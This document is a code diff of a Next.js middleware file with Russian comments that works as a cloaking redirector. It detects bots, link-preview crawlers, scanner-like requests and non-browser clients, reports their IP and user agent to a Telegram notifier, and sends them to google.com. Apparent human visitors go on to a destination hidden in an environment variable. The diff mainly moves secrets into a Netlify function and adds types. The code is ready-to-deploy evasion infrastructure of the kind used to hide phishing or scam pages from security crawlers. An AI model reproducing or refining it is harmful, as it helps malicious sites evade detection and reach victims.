@@ -1,15 +1,12 @@
+// File: middleware.ts
+// Next.js middleware (Edge runtime) — НЕ читает секреты в глобальной области.
+// Все env читаются внутри handler и Telegram-уведомления отправляются в Netlify Function.
+
 import { NextResponse } from "next/server";
 
-//
 const BOT_JSON_URL = "https://raw.githubusercontent.com/arcjet/well-known-bots/main/well-known-bots.json";
-const URL_SITE = process.env.URL_SITE || "https://yahoo.com"; 
-const BOT_LIST_TTL = 60 * 60 * 1000; // кешировать 1 час
-const TELEGRAM_TIMEOUT_MS = 2700; // таймаут для вызова телеграма в middleware
-const PRIMARY_HOST = (process.env.URL && new URL(process.env.URL).hostname.toLowerCase()) || "X3.com";
-// Вставь сюда токен/чат или используй env-переменные
-const BOT_TOKEN = process.env.TG_BOT_TOKEN || ""; // например '6438....'
-const CHAT_ID = process.env.TG_CHAT_ID || "";     // например '1743635369'
-
+const BOT_LIST_TTL = 60 * 60 * 1000; // 1 hour
+const TELEGRAM_TIMEOUT_MS = 2700; // timeout for calling the serverless notify endpoint
 const STATIC_BOT_REGEXES = [
   /\btelegrambot\b/i,
   /\bbitlybot\b/i,
@@ -26,18 +23,17 @@ const HUMAN_HEADER_HINTS = [
   "upgrade-insecure-requests",
 ];
 
-// кэш в глобальной области (edge runtime / serverless может переиспользовать)
 if (!globalThis.__bot_cache) {
-  globalThis.__bot_cache = { regexes: [...STATIC_BOT_REGEXES], fetchedAt: 0, fetching: null };
+  globalThis.__bot_cache = { regexes: [...STATIC_BOT_REGEXES], fetchedAt: 0, fetching: null } as any;
 }
 
-function getHeaderValue(req, name) {
+function getHeaderValue(req: any, name: string) {
   if (typeof req.headers?.get === "function") return req.headers.get(name);
   if (req.headers && typeof req.headers === "object") return req.headers[name];
   return undefined;
 }
 
-function getReferrerHostname(req) {
+function getReferrerHostname(req: any) {
   const ref = getHeaderValue(req, "referer") || getHeaderValue(req, "referrer");
   if (!ref) return null;
   try {
@@ -48,12 +44,11 @@ function getReferrerHostname(req) {
   }
 }
 
-function looksLikeBrowserRequest(req, ua) {
+function looksLikeBrowserRequest(req: any, ua: string) {
   if (!ua) return false;
 
   const hasMozillaToken = /Mozilla\/\d/i.test(ua);
   const acceptLanguage = (getHeaderValue(req, "accept-language") || "").trim();
-  const secChUa = (getHeaderValue(req, "secChUa") || "").trim();
 
   if (!hasMozillaToken) return false;
 
@@ -80,25 +75,20 @@ function looksLikeBrowserRequest(req, ua) {
   return false;
 }
 
-
-
 async function loadBotRegexes() {
   const now = Date.now();
-  const cache = globalThis.__bot_cache;
+  const cache: any = globalThis.__bot_cache;
 
-  // если в кэше и не устарело — вернуть
   if (cache.regexes.length && now - cache.fetchedAt < BOT_LIST_TTL) return cache.regexes;
 
-  // если уже идёт fetch — дождаться его
   if (cache.fetching) {
     try { await cache.fetching } catch(e) {}
     return cache.regexes;
   }
 
-  // запускаем fetch и сохраняем промис в cache.fetching
   cache.fetching = (async () => {
     try {
-      const res = await fetch(BOT_JSON_URL, { cf: { cacheTtl: 3600 } });
+      const res = await fetch(BOT_JSON_URL, { cf: { cacheTtl: 3600 } } as any);
       if (!res.ok) {
         console.warn("bot list fetch failed", res.status);
         cache.fetching = null;
@@ -106,19 +96,16 @@ async function loadBotRegexes() {
       }
       const json = await res.json();
 
-      const regexes = [];
+      const regexes: RegExp[] = [];
       if (Array.isArray(json)) {
         for (const entry of json) {
-          // entry может быть строкой или объектом { pattern: "..." }
-          let pattern = null;
+          let pattern: string | null = null;
           if (typeof entry === "string") pattern = entry;
           else if (entry && typeof entry.pattern === "string") pattern = entry.pattern;
           else if (entry && typeof entry.ua === "string") pattern = entry.ua;
-
           if (!pattern) continue;
 
-          // если pattern выглядит как /.../ то вырежем / и флаги (в случае)
-          let rx = null;
+          let rx: RegExp | null = null;
           try {
             if (pattern.startsWith("/") && pattern.lastIndexOf("/") > 0) {
               const last = pattern.lastIndexOf("/");
@@ -126,12 +113,7 @@ async function loadBotRegexes() {
               const flags = pattern.slice(last + 1);
               rx = new RegExp(body, flags.includes("i") ? flags : flags + "i");
             } else {
-              // безопасно создаём RegExp (экранируем обычные строки? но часто в списках уже regex)
-              // попытаемся сначала как регулярку, если упадёт — используем простую includes-проверку ниже
-              try {
-                rx = new RegExp(pattern, "i");
-              } catch (e) {
-                // если невалидная regex, превратим в экранированную строку
+              try { rx = new RegExp(pattern, "i"); } catch (e) {
                 rx = new RegExp(pattern.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "i");
               }
             }
@@ -141,7 +123,7 @@ async function loadBotRegexes() {
           if (rx) regexes.push(rx);
         }
       }
-      const merged = new Map();
+      const merged = new Map<string, RegExp>();
       for (const rx of [...STATIC_BOT_REGEXES, ...regexes]) {
         if (!rx) continue;
         const key = `${rx.source}__${rx.flags}`;
@@ -160,29 +142,21 @@ async function loadBotRegexes() {
   return cache.regexes;
 }
 
-function getDomain(req) {
+function getDomain(req: any) {
   try {
     const hostHeader = getHeaderValue(req, "x-forwarded-host") || getHeaderValue(req, "host");
     if (hostHeader) {
-      return new URL("http://" + hostHeader).hostname; // берём только hostname
+      return new URL("http://" + hostHeader).hostname;
     }
 
     const referer = getHeaderValue(req, "referer") || getHeaderValue(req, "referrer");
     if (referer) {
-      try {
-        return new URL(referer).hostname; // всегда hostname
-      } catch (e) {
-        console.warn("Bad referer URL:", referer);
-      }
+      try { return new URL(referer).hostname; } catch (e) { console.warn("Bad referer URL:", referer); }
     }
 
     const envUrl = process.env.URL || process.env.DEPLOY_URL;
     if (envUrl) {
-      try {
-        return new URL(envUrl).hostname;
-      } catch (e) {
-        return envUrl;
-      }
+      try { return new URL(envUrl).hostname; } catch (e) { return envUrl; }
     }
   } catch (err) {
     console.warn("getDomain failed:", err);
@@ -190,47 +164,26 @@ function getDomain(req) {
   return "unknown-domain";
 }
 
-
-async function notifyTelegram(text, req, data = {}) {
-  let envUrl = "unknown-domain";
-
-  const mainDomain = getDomain(req);
+// вызывает Netlify Function, где хранятся секреты
+async function notifyRemote(req: any, text: string) {
   try {
-    envUrl = process.env.URL || process.env.DEPLOY_URL || "unknown-domain";
-  } catch (err) {
-    console.warn("failed to read env vars:", err);
-  }
-
-  const token = BOT_TOKEN || process.env.TG_BOT_TOKEN;
-  const chat = CHAT_ID || process.env.TG_CHAT_ID;
-  if (!token || !chat) {
-    console.warn("Telegram token/chat not set");
-    return;
-  }
-
-  // пробуем вытащить домен
-  const finalText = `🌐 main: ${mainDomain} / ${envUrl}\n${text}`;
-
-  const controller = new AbortController();
-  const id = setTimeout(() => controller.abort(), TELEGRAM_TIMEOUT_MS);
-
-  try {
-    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: chat, text: finalText }),
+    const endpoint = new URL('/.netlify/functions/notify-telegram', req.url).toString();
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), TELEGRAM_TIMEOUT_MS);
+    await fetch(endpoint, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ text, mainDomain: getDomain(req) }),
       signal: controller.signal,
     });
-  } catch (e) {
-    console.warn("Telegram notify failed (ignored)", e?.message || e);
-  } finally {
     clearTimeout(id);
+  } catch (e) {
+    // игнорируем ошибки уведомлений
+    console.warn('notifyRemote failed (ignored)', e?.message || e);
   }
 }
 
-
-
-export async function middleware(req) {
+export async function middleware(req: any) {
   const ua = req.headers.get("user-agent") || "";
   const method = req.method?.toUpperCase?.() || "GET";
   const refererHeader = getHeaderValue(req, "referer") || getHeaderValue(req, "referrer") || "";
@@ -240,70 +193,55 @@ export async function middleware(req) {
   const url = req.nextUrl.pathname + (req.nextUrl.search || "");
   const ip = req.headers.get("x-forwarded-for") || req.headers.get("cf-connecting-ip") || "unknown";
   let envUrl = process.env.URL || process.env.DEPLOY_URL || "unknown-domain";
-  // --- достаем домен из ENV ---
+
   const mainDomain = getDomain(req);
   try {
-    // убираем https:// или http:// если есть
     envUrl = new URL(envUrl).host;
   } catch (e) {
     console.warn("Invalid envUrl:", envUrl);
   }
 
-  // дополнительные хедеры посетителя для логов
   const acceptLanguage = getHeaderValue(req, "accept-language") || "-";
   const secChUa = getHeaderValue(req, "sec-ch-ua") || getHeaderValue(req, "sec-ch-ua-full") || "-";
   const secChUaMobile = getHeaderValue(req, "sec-ch-ua-mobile") || "-";
   const secChUaPlatform = getHeaderValue(req, "sec-ch-ua-platform") || "-";
 
-  // загружаем паттерны (из кэша или сети)
-  let regexes = [];
-  try {
-    regexes = await loadBotRegexes();
-  } catch (e) {
-    console.warn("loadBotRegexes failed", e?.message || e);
-  }
+  let regexes: RegExp[] = [];
+  try { regexes = await loadBotRegexes(); } catch (e) { console.warn("loadBotRegexes failed", e?.message || e); }
 
-  const isBot = regexes.some(rx => {
-    try { return rx.test(ua); } catch (e) { return false; }
-  });
+  const isBot = regexes.some(rx => { try { return rx.test(ua); } catch (e) { return false; } });
 
   const isPreview = /prefetch|preview|prerender/.test(purposeHeader) || secFetchDest === "empty";
   const suspiciousHead = method === "HEAD" && !refererHeader;
   const isIPv6 = ip.includes(":");
-  // нормализуем строки для поиска
+
   const rawUrlForCheck = decodeURIComponent((url || "").toString()).replace(/\s+/g, " ");
   const rawRefererForCheck = decodeURIComponent((refererHeader || "").toString()).replace(/\s+/g, " ");
-  
-  // ищем .php или .xml в любом месте, или wp-* / wp-includes как ключевые слова
+
   const containsPhpOrXml = /(\.php\b|\.xml\b)/i.test(rawUrlForCheck + " " + rawRefererForCheck)
-    || /(?:^|\/|[.\-])wp[-_]?/i.test(rawUrlForCheck + " " + rawRefererForCheck)  // ловит wp-, wp_, wp-includes, /wp-
+    || /(?:^|\/|[.\-])wp[-_]?/i.test(rawUrlForCheck + " " + rawRefererForCheck)
     || /wp-includes/i.test(rawUrlForCheck + " " + rawRefererForCheck);
 
-if (isBot || isPreview || suspiciousHead || containsPhpOrXml) {
-  const reason = isBot
-    ? "🚨 Known bot detected"
-    : isPreview
-      ? "🚨 Срабатывание Heuristic блокировки (purpose: preview/prefetch)"
-      : containsPhpOrXml
-        ? "🚨 Подозрительный запрос (referer или url содержит .php или .xml)"
-          : "🚨 Срабатывание Heuristic блокировки (HEAD без referer)";
-  notifyTelegram(
-    `${reason}\nUA: ${ua}\nIP: ${ip}\nURL: ${url}\nReferer: ${refererHeader || "—"}\nMethod: ${method}\nPurpose: ${purposeHeader || "—"}`,
-    req
-  );
-  return NextResponse.redirect("https://google.com");
+  if (isBot || isPreview || suspiciousHead || containsPhpOrXml) {
+    const reason = isBot
+      ? "🚨 Known bot detected"
+      : isPreview
+        ? "🚨 Срабатывание Heuristic блокировки (purpose: preview/prefetch)"
+        : containsPhpOrXml
+          ? "🚨 Подозрительный запрос (referer или url содержит .php или .xml)"
+            : "🚨 Срабатывание Heuristic блокировки (HEAD без referer)";
 
-}
+    // вызываем remote notify (serverless function с секретами)
+    notifyRemote(req, `${reason}\nUA: ${ua}\nIP: ${ip}\nURL: ${url}\nReferer: ${refererHeader || "—"}\nMethod: ${method}\nPurpose: ${purposeHeader || "—"}`);
 
-  // пустой юа — сразу считаем ботом
-  if (!isHumanLike) {
-    notifyTelegram(
-      `🚨 Подозрительный запрос (нет признаков браузера)\nUA: ${ua || "<пусто>"}\nIP: ${ip}\nURL: ${url}\nReferer: ${refererHeader || "—"}\nMethod: ${method}\nPurpose: ${purposeHeader || "—"}`,
-      req
-    );
     return NextResponse.redirect("https://google.com");
   }
-  // --- улучшенный лог: теперь вместе с mainDomain и referer выводим данные посетителя ---
+
+  if (!isHumanLike) {
+    notifyRemote(req, `🚨 Подозрительный запрос (нет признаков браузера)\nUA: ${ua || "<пусто>"}\nIP: ${ip}\nURL: ${url}\nReferer: ${refererHeader || "—"}\nMethod: ${method}\nPurpose: ${purposeHeader || "—"}`);
+    return NextResponse.redirect("https://google.com");
+  }
+
   try {
     console.log(JSON.stringify({
       mainDomain,
@@ -319,17 +257,15 @@ if (isBot || isPreview || suspiciousHead || containsPhpOrXml) {
       timestamp: new Date().toISOString()
     }));
   } catch (e) {
-    // на случай если console.log не поддерживает сложные объекты в вашей среде
     console.log(`mainDomain: ${mainDomain} | Referer: ${refererHeader || "—"} | UA: ${ua || "—"} | IP: ${ip}`);
   }
 
-  // --- добавляем параметр src=envUrl в ссылку ---
+  // Читаем URL_SITE динамически (не встраиваем в бандл)
+  const URL_SITE = process.env.URL_SITE || "https://yahoo.com";
   const target = new URL(URL_SITE);
   target.searchParams.set("s3", mainDomain);
 
-  // редиректим на обновленную ссылку
   return NextResponse.redirect(target.toString());
 }
 
-// применяем на все роуты
 export const config = { matcher: ["/:path*"] };
